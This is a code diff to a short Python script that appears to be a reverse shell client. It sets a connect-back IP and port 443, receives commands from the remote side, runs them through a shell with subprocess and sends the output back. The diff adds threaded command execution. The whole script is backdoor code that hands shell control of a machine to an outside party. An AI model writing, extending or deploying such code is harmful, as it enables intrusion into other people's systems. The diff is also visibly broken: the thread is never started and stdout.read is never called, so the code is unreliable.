@@ -1,6 +1,7 @@
 import socket
 import time
 import subprocess
+import threading
 
 IP = '192.168.0.108'
 PORT = 443
@@ -22,7 +23,8 @@ def listen(client):
             if data == '/exit':
                 return
             else:
-                cmd(client, data)
+                threading.Thread(target=cmd, args=(client, data))
+
     except Exception as Error:
         print('ERRO: ', Error)
         client.close()
@@ -30,8 +32,8 @@ def listen(client):
 def cmd(client, data):
     try:
         proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-        output = proc.stdout.read
-        client.send(output + b"\n")
+        output = proc.stdout.read #+ proc.stderr.read
+        client.send(output)
     except Exception as Error:
         print('ERROR: ', Error)
 
